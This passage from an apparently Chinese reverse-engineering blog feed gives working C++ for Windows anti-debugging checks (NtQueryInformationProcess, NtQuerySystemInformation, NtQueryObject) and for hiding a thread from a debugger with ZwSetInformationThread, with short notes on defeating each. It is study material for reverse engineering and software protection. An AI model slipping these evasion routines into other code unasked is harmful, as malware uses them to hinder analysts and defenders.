WINAPI NtQueryInfomationProcess(</span><br><span class="line">__in HANDLEProcessHandle, //进程句柄</span><br><span class="line">__in PROCESSINFOCLASSProcessInformationClass,  //检索信息的类型,枚举值如下</span><br><span class="line">__outPVOIDProcessInformation,   //保存类型的缓冲区</span><br><span class="line">__inULONGProcessInformationLength,  //大小</span><br><span class="line">__out_optPULONG ReturnLength   //返回大小</span><br><span class="line">); </span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span><span class="title">PROCESSINFOCLASS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">ProcessBasicInformation = <span class="number">0</span></span><br><span class="line">ProcessQuotaLimits,</span><br><span class="line">ProcessIoCounters,</span><br><span class="line">ProcessVmCounters,</span><br><span class="line">ProcessTimes,</span><br><span class="line">ProcessBasePriority,</span><br><span class="line">ProcessRaisePriority,</span><br><span class="line">ProcessDebugPort = <span class="number">7</span>,<span class="comment">//0x7</span></span><br><span class="line">ProcessExceptionPort,</span><br><span class="line">ProcessAccessToken,</span><br><span class="line">ProcessLdatInformation,</span><br><span class="line">ProcessLdtSize,</span><br><span class="line">ProcessDefaultHardErrorMode,</span><br><span class="line">ProcessIoPortHandlers,</span><br><span class="line">ProcessPooledUsageAndLimits,</span><br><span class="line">ProcessWorkingSetWatch,</span><br><span class="line">ProcessUserModeIOPL,</span><br><span class="line">ProcessEnableAlignmentFaultFixup,</span><br><span class="line">ProcessPriorityClass,</span><br><span class="line">ProcessWx86Information,</span><br><span class="line">ProcessHandleCount,</span><br><span class="line">ProcessAffinityMask,</span><br><span class="line">ProcessPriorityBoost,</span><br><span class="line">MaxProcessInforClass,</span><br><span class="line">ProcessWow64Informatio = <span class="number">26</span>,</span><br><span class="line">ProcessImageFileName = <span class="number">27</span>,</span><br><span class="line">ProcessDebugObjectHandle = <span class="number">30</span>,<span class="comment">//0x1E</span></span><br><span class="line">ProcessDebugFlags = <span class="number">31</span>,<span class="comment">//0x1F</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>检测代码：</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI *pfnNtQueryInformationProcess)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">UINT ProcessInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID ProcessInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG ProcessInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG ReturnLength </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">anti_Debug1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">UINT ProcessDebugPort = <span class="number">7</span>;</span><br><span class="line">UINT ProcessDebugObjectHandle = <span class="number">0x1E</span>;</span><br><span class="line">UINT ProcessDebugFlag = <span class="number">0x1F</span>;</span><br><span class="line"><span class="keyword">int</span> ProcessInformation = <span class="number">0</span>;</span><br><span class="line">HMODULE hNt = <span class="built_in">LoadLibrary</span>(<span class="string">L&quot;ntdll.dll&quot;</span>);</span><br><span class="line">pfnNtQueryInformationProcess gNtQueryInformationProcess = (pfnNtQueryInformationProcess)<span class="built_in">GetProcAddress</span>(hNt, <span class="string">&quot;NtQueryInformationProcess&quot;</span>);</span><br><span class="line"><span class="comment">//检测ProcessDebugPort，处于调试状态时，ProcessInformation值为0xffffffff</span></span><br><span class="line"><span class="built_in">gNtQueryInformationProcess</span>(<span class="built_in">GetCurrentProcess</span>(), ProcessDebugPort, &amp;ProcessInformation, <span class="built_in"><span class="keyword">sizeof</span></span>(ProcessInformation), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(ProcessInformation != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//检测ProcessDebugObjectHandle，处于调试状态时，ProcessInformation值不为0</span></span><br><span class="line"><span class="built_in">gNtQueryInformationProcess</span>(<span class="built_in">GetCurrentProcess</span>(), ProcessDebugObjectHandle, &amp;ProcessInformation, <span class="built_in"><span class="keyword">sizeof</span></span>(ProcessInformation), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ProcessInformation!=<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//检测ProcessDebugFlag，处于调试状态时，ProcessInformation值为0</span></span><br><span class="line"><span class="built_in">gNtQueryInformationProcess</span>(<span class="built_in">GetCurrentProcess</span>(), ProcessDebugFlag, &amp;ProcessInformation, <span class="built_in"><span class="keyword">sizeof</span></span>(ProcessInformation), <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (ProcessInformation==<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x02-NtQuerySystemInformation"><a href="#0x02-NtQuerySystemInformation" class="headerlink" title="0x02 NtQuerySystemInformation()"></a>0x02 NtQuerySystemInformation()</h4><p><strong>上面的方法都是通过探测调试器来判断自己的进程是否处于被调试状态，这是一种很直接的调试器探测方法，当然还有间接探测调试器的方法，借助该方法可以检测调试环境，若显露出调试器的端倪，可直接停止程序。</strong></p><ul><li>函数原型：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NTSTATUS WINAPI NtQuerySystemInformation(</span><br><span class="line">__inSYSTEM_INFOMATION_CLASS SystemInformationClass,</span><br><span class="line">__inout PVOID SystemInformation,</span><br><span class="line">__in ULONG SystemInformationLength,</span><br><span class="line">__out_opt PULONG ReturnLength</span><br><span class="line">);</span><br></pre></td></tr></table></figure><ul><li>SYSTEM_INFORMATION_CLASS SystemInformationClass参数中指定需要的系统信息类型，将某结构体的地址传递给PVOID SystemInformaiton，API返回时，该结构体填充着相关信息。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">typedef enum _SYSTEM_INFORMATION_CLASS</span><br><span class="line">&#123;</span><br><span class="line">SystemBasicInformation = 0,</span><br><span class="line">SystemPerformanceInformation = 2,</span><br><span class="line">SystemTimeOfDayInformation = 3,</span><br><span class="line">SystemProcessInformation = 5,</span><br><span class="line">SystemProcessorPerformanceInformation = 8,</span><br><span class="line">SystemInterruptInformation = 23,</span><br><span class="line">SystemExceptionInformation = 33,</span><br><span class="line">SystemKernelDebuggerInformation = 35,    //0x23</span><br><span class="line">SystemRegistryQuotaInformation = 37,</span><br><span class="line">SystemLookasideInformation = 45</span><br><span class="line">&#125;SYSTEM_INFORMATION_CLASS;</span><br></pre></td></tr></table></figure><ul><li>实现代码</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">anti_Debug1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(NTAPI *pNtQuerySystemInformation)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">UINT SystemInfomationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">PVOID SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">ULONG SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">PULONG ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SYSTEM_KERNEL_DEBUGGER_INFORMATION</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">BOOLEAN DebuggerEnabled;</span><br><span class="line">BOOLEAN DebuggerNotPresent;</span><br><span class="line">&#125;SYSTEM_KERNEL_DEBUGGER_INFORMATION, *PSYSTEM_KERNEL_DEBUGGER_INFORMATION;</span><br><span class="line"></span><br><span class="line">pNtQuerySystemInformation NtQuerySystemInformation;</span><br><span class="line">NtQuerySystemInformation = (pNtQuerySystemInformation)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;ntdll&quot;</span>), <span class="string">&quot;NtQuerySystemInformation&quot;</span>);</span><br><span class="line">ULONG SystemKernelDebuggerInformation = <span class="number">0x23</span>;</span><br><span class="line">ULONG ulReturnedLength = <span class="number">0</span>;</span><br><span class="line">SYSTEM_KERNEL_DEBUGGER_INFORMATION DebuggerInfo = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line"><span class="built_in">NtQuerySystemInformation</span>(SystemKernelDebuggerInformation,</span><br><span class="line">(PVOID)&amp;DebuggerInfo,</span><br><span class="line"><span class="built_in"><span class="keyword">sizeof</span></span>(DebuggerInfo),</span><br><span class="line">&amp;ulReturnedLength);</span><br><span class="line"><span class="keyword">if</span> (DebuggerInfo.DebuggerEnabled)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PS:<code>似乎只适用于win7和xp，xp对抗该方法需修改boot.ini文件,删除/debugPort=com1 /baudrate=115200 /Debug值，win7下命令行执行bcdedit /debug off命令</code></p><h4 id="0x03-NtQueryObject"><a href="#0x03-NtQueryObject" class="headerlink" title="0x03 NtQueryObject"></a>0x03 NtQueryObject</h4><p><strong>系统中的某个调试器调试进程时，会创建1个调试对象类型的内核对象。检测该对象是否存在即可判断是否有进程正在被调试。</strong></p><ul><li>函数原型</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">NtQueryObject</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in_optHANDLE Handle,</span></span></span><br><span class="line"><span class="params"><span class="function">__in OBJECT_INFORMATION_CLASS ObjectInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">__out_opt PVOID ObjectInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">__inULONG ObjectInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">__out_optPULONG ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> _<span class="title">OBJECT_INFORMATION_CLASS</span>&#123;</span></span><br><span class="line">    ObjectBasicInformation,</span><br><span class="line">    ObjectNameInformaiton,</span><br><span class="line">    ObjectTypeInformation,</span><br><span class="line">    ObjectAllTypeInformation,  <span class="comment">//3</span></span><br><span class="line">    ObjectHandleInformation</span><br><span class="line">&#125;OBJECT_INFORMATION_CLASS, *POBJECT_INFORMATION_CLASS;</span><br></pre></td></tr></table></figure><ul><li><p>先使用ObjectAllTypeInformation值获取系统所有对象信息，然后检测是否存在调试对象。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">OBJECT_INFORMATION_CLASS</span> &#123;</span></span><br><span class="line">    ObjectBasicInformation,</span><br><span class="line">    ObjectNameInformation,</span><br><span class="line">    ObjectTypeInformation,</span><br><span class="line">    ObjectAllTypesInformation,</span><br><span class="line">  ObjectHandleInformation</span><br><span class="line">&#125; OBJECT_INFORMATION_CLASS, *POBJECT_INFORMATION_CLASS;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MyNtQueryObject</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LSA_UNICODE_STRING</span> &#123;</span></span><br><span class="line">        USHORT Length;</span><br><span class="line">      USHORT MaximumLength;</span><br><span class="line">        PWSTR Buffer;</span><br><span class="line">  &#125; LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(WINAPI *NTQUERYOBJECT)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        HANDLE Handle,</span></span></span><br><span class="line"><span class="params"><span class="function">        OBJECT_INFORMATION_CLASS ObjectInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">        PVOID ObjectInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">        ULONG ObjectInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">        PULONG ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">#<span class="meta-keyword">pragma</span> pack(1)</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_TYPE_INFORMATION</span> &#123;</span></span><br><span class="line">        UNICODE_STRING TypeName;</span><br><span class="line">        ULONG TotalNumberOfHandles;</span><br><span class="line">      ULONG TotalNumberOfObjects;</span><br><span class="line">    &#125;OBJECT_TYPE_INFORMATION, *POBJECT_TYPE_INFORMATION;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">OBJECT_ALL_INFORMATION</span> &#123;</span></span><br><span class="line">        ULONG                   NumberOfObjectsTypes;</span><br><span class="line">        OBJECT_TYPE_INFORMATION ObjectTypeInformation[<span class="number">1</span>];</span><br><span class="line">    &#125; OBJECT_ALL_INFORMATION, *POBJECT_ALL_INFORMATION;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">pragma</span> pack()</span></span><br><span class="line">       </span><br><span class="line">    POBJECT_ALL_INFORMATION pObjectAllInfo = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">void</span> *pBuf = <span class="literal">NULL</span>;</span><br><span class="line">    ULONG lSize = <span class="number">0</span>;</span><br><span class="line">    BOOL bDebugging = FALSE;</span><br><span class="line"></span><br><span class="line">    NTQUERYOBJECT pNtQueryObject = (NTQUERYOBJECT)</span><br><span class="line">                                    <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;ntdll.dll&quot;</span>), </span><br><span class="line">                                                   <span class="string">&quot;NtQueryObject&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get the size of the list</span></span><br><span class="line">    <span class="built_in">pNtQueryObject</span>(<span class="literal">NULL</span>, ObjectAllTypesInformation, &amp;lSize, <span class="built_in"><span class="keyword">sizeof</span></span>(lSize), &amp;lSize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate list buffer</span></span><br><span class="line">    pBuf = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, lSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get the actual list</span></span><br><span class="line">    <span class="built_in">pNtQueryObject</span>((HANDLE)<span class="number">0xFFFFFFFF</span>, ObjectAllTypesInformation, pBuf, lSize, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    pObjectAllInfo = (POBJECT_ALL_INFORMATION)pBuf;</span><br><span class="line"></span><br><span class="line">    UCHAR *pObjInfoLocation = (UCHAR *)pObjectAllInfo-&gt;ObjectTypeInformation;</span><br><span class="line">    POBJECT_TYPE_INFORMATION pObjectTypeInfo = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span>( UINT i = <span class="number">0</span>; i &lt; pObjectAllInfo-&gt;NumberOfObjectsTypes; i++ )</span><br><span class="line">    &#123;</span><br><span class="line">        pObjectTypeInfo = (POBJECT_TYPE_INFORMATION)pObjInfoLocation;</span><br><span class="line">        <span class="keyword">if</span>( <span class="built_in">wcscmp</span>(<span class="string">L&quot;DebugObject&quot;</span>, pObjectTypeInfo-&gt;TypeName.Buffer) == <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            bDebugging = (pObjectTypeInfo-&gt;TotalNumberOfObjects &gt; <span class="number">0</span>) ? TRUE : FALSE;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// calculate next struct</span></span><br><span class="line">        pObjInfoLocation = (UCHAR*)pObjectTypeInfo-&gt;TypeName.Buffer;</span><br><span class="line">        pObjInfoLocation += pObjectTypeInfo-&gt;TypeName.Length;</span><br><span class="line">        pObjInfoLocation = (UCHAR*)(((ULONG)pObjInfoLocation &amp; <span class="number">0xFFFFFFFC</span>) + <span class="built_in"><span class="keyword">sizeof</span></span>(ULONG));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( pBuf )</span><br><span class="line">    <span class="built_in">VirtualFree</span>(pBuf, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NtQueryObject(ObjectAllTypesInformation)\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>( bDebugging )  <span class="built_in">printf</span>(<span class="string">&quot;  =&gt; Debugging!!!\n\n&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span>              <span class="built_in">printf</span>(<span class="string">&quot;  =&gt; Not debugging...\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="0x04-ZwSetInformationThread"><a href="#0x04-ZwSetInformationThread" class="headerlink" title="0x04 ZwSetInformationThread()"></a>0x04 ZwSetInformationThread()</h4><p><strong>该函数可以强制分离被调试者和调试器的技术，利用该函数被调试者可将自身从调试器中分离出来。</strong></p><ul><li>测试代码</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DetachDebugger</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">THREAD_INFORMATION_CLASS</span> &#123;</span></span><br><span class="line">        ThreadBasicInformation,</span><br><span class="line">        ThreadTimes,</span><br><span class="line">        ThreadPriority,</span><br><span class="line">        ThreadBasePriority,</span><br><span class="line">        ThreadAffinityMask,</span><br><span class="line">        ThreadImpersonationToken,</span><br><span class="line">        ThreadDescriptorTableEntry,</span><br><span class="line">        ThreadEnableAlignmentFaultFixup,</span><br><span class="line">        ThreadEventPair,</span><br><span class="line">        ThreadQuerySetWin32StartAddress,</span><br><span class="line">        ThreadZeroTlsCell,</span><br><span class="line">        ThreadPerformanceCount,</span><br><span class="line">        ThreadAmILastThread,</span><br><span class="line">        ThreadIdealProcessor,</span><br><span class="line">        ThreadPriorityBoost,</span><br><span class="line">        ThreadSetTlsArrayAddress,</span><br><span class="line">        ThreadIsIoPending,</span><br><span class="line">        ThreadHideFromDebugger           <span class="comment">// 17 (0x11)</span></span><br><span class="line">    &#125; THREAD_INFORMATION_CLASS, *PTHREAD_INFORMATION_CLASS;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span> <span class="params">(WINAPI* ZWSETINFORMATIONTHREAD)</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">        HANDLE ThreadHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">        THREAD_INFORMATION_CLASS ThreadInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">        PVOID ThreadInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">        ULONG ThreadInformationLength</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br><span class="line"></span><br><span class="line">    ZWSETINFORMATIONTHREAD pZwSetInformationThread = <span class="literal">NULL</span>;</span><br><span class="line">    pZwSetInformationThread = (ZWSETINFORMATIONTHREAD)</span><br><span class="line">                              <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;ntdll.dll&quot;</span>), </span><br><span class="line">                                             <span class="string">&quot;ZwSetInformationThread&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">pZwSetInformationThread</span>(<span class="built_in">GetCurrentThread</span>(), ThreadHideFromDebugger, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ZwSetInformationThread() -&gt; Debugger detached!!!\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>ZwSetInformationThread()函数，是一个系统原生API，顾名思义，他是用来为线程设置信息的。该函数有两个参数，第一个参数ThreadHandle用来接收当前进程的句柄，第二个参数ThreadInformationClass标识接收线程信息的类型，若其值设置为ThreadHideFromDebugger(0x11)，调用该函数后，调试进程就会被分离出来。ZwSetInformationThread()API不会对正常运行的程序(非调试运行)产生任何影响，但若运行的是调试器程序，调用该API将使调试器终止运行，同时终止自身进程。</p></li><li><p>对抗方法，在调用该函数时，修改其压栈参数，就能让其接收不到信息。该函数的反调试原理是将线程隐藏起来，调试器就无法接收到信息，从而无法调试，另外，xp以后的系统还可以使用DebugActive-ProcessStop() API。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL WINAPI DebugActiveProcessStop</span><br><span class="line">(</span><br><span class="line">__inDWORD dwProcessId</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;反调试笔记&quot;&gt;&lt;a href=&quot;#反调试笔记&quot; class=&quot;headerlink&quot; title=&quot;反调试笔记&quot;&gt;&lt;/a&gt;反调试笔记&lt;/h1&gt;&lt;h1 id=&quot;静态反调试&quot;&gt;&lt;a href=&quot;#静态反调试&quot; class=&quot;headerlink&quot; title=&quot;静态反
      
    
    </summary>
    
      <category term="随记" scheme="https://richard447.github.io/categories/%E9%9A%8F%E8%AE%B0/"/>
    
    
      <category term="反调试" scheme="https://richard447.github.io/tags/%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>非C\C++语言的编译链接程序的反编译</title>
    <link href="https://richard447.github.io/2020/01/07/%E9%9D%9EC%E3%80%81C-%E8%AF%AD%E8%A8%80%E7%9A%84%E7%BC%96%E8%AF%91%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
    <id>https://richard447.github.io/2020/01/07/非C、C-语言的编译链接程序的反编译/</id>
    <published>2020-01-06T16:00:00.000Z</published>
    <updated>2021-03-06T16:00:00.000Z</updated>
    
